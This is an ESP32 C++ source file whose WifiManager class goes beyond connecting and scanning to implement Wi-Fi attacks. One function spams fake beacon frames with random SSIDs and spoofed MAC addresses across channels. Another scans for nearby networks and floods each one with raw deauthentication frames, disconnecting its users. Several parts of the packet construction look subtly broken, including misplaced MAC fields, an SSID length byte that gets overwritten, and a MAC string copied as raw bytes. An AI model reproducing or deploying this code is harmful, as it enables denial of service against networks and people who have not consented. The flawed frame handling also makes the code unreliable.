#include "globals.h"

extern Logger l;
extern Led led;

class WifiManager
{
public:
	WifiManager() {
		// switchChannel();
	}

	void connectToWiFi(const char *ssid, const char *password)
	{
		WiFi.begin(ssid, password);
		while (WiFi.status() != WL_CONNECTED)
		{
			delay(1000);
			Serial.println("Connecting to WiFi...");
		}
		Serial.println("Connected to WiFi.");
	}

	void scanNetworks()
	{
		int numNetworks = WiFi.scanNetworks();
		for (int i = 0; i < numNetworks; i++)
		{
			Serial.print("Network SSID: ");
			Serial.println(WiFi.SSID(i));
			// You can add more details or process the networks as needed.
		}
	}

	void spamAP()
	{
		for (int i = 1; i < 14; i++)
		{
			String name = String("FS | ") + generateRandomString(10);
			// createAccessPoint(name.c_str(), "");
			createAndBroadcastBeacon(name.c_str());
			// esp_wifi_set_channel(i, WIFI_SECOND_CHAN_NONE);
			switchChannel();
			l.log(Logger::INFO, String("Creating access point: ") + name);
		}
	}

	// void deauthenticate(const char* targetMAC, int numPackets) {
	//     WiFi.disconnect();
	//     delay(100);
	//     WiFi.mode(WIFI_STA);
	//     delay(100);
	//     wifi_send_pkt_freedom(deauthPacket(targetMAC), 0, 0);
	// }

	void scanNetworksAndDeauth(int numPackets)
	{
		int numNetworks = WiFi.scanNetworks();
		for (int i = 0; i < numNetworks; i++)
		{
			String ssid = WiFi.SSID(i);
			if (ssid.length() > 0)
			{
				sendDeauthPackets(ssid.c_str(), numPackets);
			}
		}
	}

	void createAccessPoint(const char *apName, const char *apPassword)
	{
		WiFi.softAP(apName, apPassword);
	}

private:
	int current_channel = 1;

	void switchChannel() {
		if (current_channel > 14)
			current_channel = 1;

		switch (current_channel)
		{
		case 1:
			current_channel++;
			break;
		case 6:
			current_channel++;
			break;
		case 11:
			current_channel++;
			break;
		}

		l.log(Logger::INFO, "Switching to interface channel " + String(current_channel) + "...");
	    esp_wifi_set_channel(current_channel, WIFI_SECOND_CHAN_NONE);
		current_channel++;
		delay(1);
	}

	String generateRandomString(int length) {
		const char characters[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
		const int charactersLength = sizeof(characters) - 1;
		String randomString = "";

		for (int i = 0; i < length; i++) {
			int randomIndex = random(charactersLength);
			randomString += characters[randomIndex];
		}

		return randomString;
	}

	void sendDeauthPackets(const char *targetSSID, int numPackets)
	{
		String targetMAC = getBSSID(targetSSID);
		if (targetMAC.length() > 0)
		{
			for (int i = 0; i < numPackets; i++)
			{
				sendDeauthPacket(targetMAC.c_str());
			}
		}
	}

	String getBSSID(const char *targetSSID)
	{
		int numNetworks = WiFi.scanNetworks();
		for (int i = 0; i < numNetworks; i++)
		{
			if (strcmp(targetSSID, WiFi.SSID(i).c_str()) == 0)
			{
				return WiFi.BSSIDstr(i);
			}
		}
		return "";
	}

	void randomMacAddress(uint8_t mac[6])
	{
		randomSeed(micros());
		mac[0] = 0x2;
		for (int i = 1; i < 6; i++)
		{
			mac[i] = random(0, 256);
		}
		// Set the "Locally Administered" bit (bit 1) of the first byte
		mac[0] |= 0x02;
	}

	uint8_t* randomMacAddress() {
		static uint8_t macAddr[6];
		randomSeed(micros());
		macAddr[0] = 0x2;
		for (int i = 1; i < 6; i++) {
			macAddr[i] = random(0, 256);
		}
		// Set the "Locally Administered" bit (bit 1) of the first byte
		macAddr[0] |= 0x02;
		return macAddr;
	}

	void createAndBroadcastBeacon(const char *ssid) {
		// Calculate the length of the SSID (including '\n') and set it in the beacon frame.
		switchChannel();
		int ssidLen = strlen(ssid);
		beaconPacket[38] = ssidLen;

		uint8_t* macAddr = randomMacAddress();
		// write MAC address into beacon frame
		memcpy(&beaconPacket[10], macAddr, 6);
		memcpy(&beaconPacket[16], macAddr, 6);

		// reset SSID
		char emptySSID[32];
    	memcpy(&beaconPacket[38], emptySSID, 32);

		// Copy the SSID into the beacon frame.
		memcpy(&beaconPacket[39], ssid, ssidLen);

		int packetCounter = 0;
		// Send the beacon frame multiple times for better broadcasting.
		for (int i = 0; i < 3; i++) {
			packetCounter += esp_wifi_80211_tx(WIFI_IF_STA, beaconPacket, sizeof(beaconPacket), 0) == 0;
			delay(1);
		}
	}

	void sendDeauthPacket(const char *targetMAC)
	{
		l.log(Logger::INFO, "Sending deauth packet to " + String(targetMAC));
		switchChannel();
		uint8_t packet[26] = {
			0xc0, 0x00, 0x3a, 0x01,
			0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
			0xf0, 0xff, 0x02, 0x00
		};

		// Generate a random MAC address for the sender
		randomMacAddress(packet + 4);

		// Copy the target MAC address into the packet
		memcpy(&packet[10], targetMAC, 6);

		WiFi.disconnect();
		delay(100);
		WiFi.mode(WIFI_STA);
		delay(100);
		// wifi_send_pkt_freedom(packet, sizeof(packet), 0);
		esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
	}

	    uint8_t beaconPacket[128] = { 
			0x80, 0x00, 0x00, 0x00, //Frame Control, Duration
			/*4*/   0xff, 0xff, 0xff, 0xff, 0xff, 0xff, //Destination address 
			/*10*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //Source address - overwritten later
			/*16*/  0x01, 0x02, 0x03, 0x04, 0x05, 0x06, //BSSID - overwritten to the same as the source address
			/*22*/  0xc0, 0x6c, //Seq-ctl
			/*24*/  0x83, 0x51, 0xf7, 0x8f, 0x0f, 0x00, 0x00, 0x00, //timestamp - the number of microseconds the AP has been active
			/*32*/  0x64, 0x00, //Beacon interval
			/*34*/  0x01, 0x04, //Capability info
			/* SSID */
			/*36*/  0x00
		};

	int packetSize = sizeof(beaconPacket);

};